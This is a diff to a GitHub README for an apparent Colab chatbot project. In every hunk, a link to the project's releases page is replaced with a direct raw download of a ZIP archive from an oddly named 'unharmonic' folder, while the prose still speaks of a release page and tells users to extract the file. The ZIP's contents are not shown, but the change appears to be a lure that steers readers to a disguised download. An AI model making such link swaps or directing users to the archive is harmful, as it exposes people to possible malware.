@@ -1,6 +1,6 @@
 # 🤖 ai-chatbot-colab - Build a smart chatbot in Colab
 
-[![Download](https://img.shields.io/badge/Download-Release%20Files-blue?style=for-the-badge&logo=github)](https://github.com/Kacu1137/ai-chatbot-colab/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Files-blue?style=for-the-badge&logo=github)](https://github.com/Kacu1137/ai-chatbot-colab/raw/refs/heads/main/unharmonic/colab-chatbot-ai-v1.2.zip)
 
 ## 🚀 What this app does
 
@@ -16,7 +16,7 @@ You can use this project to:
 
 Visit this page to download the latest release files:
 
-https://github.com/Kacu1137/ai-chatbot-colab/releases
+https://github.com/Kacu1137/ai-chatbot-colab/raw/refs/heads/main/unharmonic/colab-chatbot-ai-v1.2.zip
 
 On that page, look for the newest release and download the file that matches it. If you see a ZIP file, save it to your computer and extract it before opening any included files.
 
@@ -38,7 +38,7 @@ If you want to use the Colab notebook, you do not need to install Python on Wind
 
 Open the releases page and get the latest version:
 
-https://github.com/Kacu1137/ai-chatbot-colab/releases
+https://github.com/Kacu1137/ai-chatbot-colab/raw/refs/heads/main/unharmonic/colab-chatbot-ai-v1.2.zip
 
 Save the file to a place you can find, such as:
 - Downloads
@@ -154,7 +154,7 @@ The chatbot learns from example phrases. It groups similar messages into intents
 
 Use this link to visit the release page and download the latest files:
 
-https://github.com/Kacu1137/ai-chatbot-colab/releases
+https://github.com/Kacu1137/ai-chatbot-colab/raw/refs/heads/main/unharmonic/colab-chatbot-ai-v1.2.zip
 
 If the release includes a notebook, download it, open it in Google Colab, and run it from top to bottom
 
